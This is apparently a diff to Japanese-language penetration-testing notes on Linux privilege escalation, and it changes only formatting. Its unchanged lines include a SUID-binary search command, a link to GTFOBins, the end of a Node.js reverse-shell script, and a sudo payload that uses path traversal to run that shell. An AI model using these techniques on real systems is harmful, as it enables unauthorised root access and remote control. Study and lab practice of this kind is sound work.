@@ -36,9 +36,9 @@ export PATH=/tmp:$PATH
 ---
 ## ## 2. SUID
    1.SUIDまたはSGIDビットが「s」で設定されているコマンドを特定する。
-   ```sh
-   find / -type f -perm -04000 -ls 2>/dev/null
-   ```
+```sh
+find / -type f -perm -04000 -ls 2>/dev/null
+```
 
    2. 上記で見つかったものを以下のサイトで調べる。
 	https://gtfobins.github.io/#
@@ -122,8 +122,8 @@ sh.stderr.pipe(client);
 return /a/; // Prevents the Node.js application from crashing
 })();
 ```
+
 - payload
 ```sh
 sudo /usr/bin/node /usr/local/scripts/../../../..//home/angoose/reverseshell.js
 ```
-        
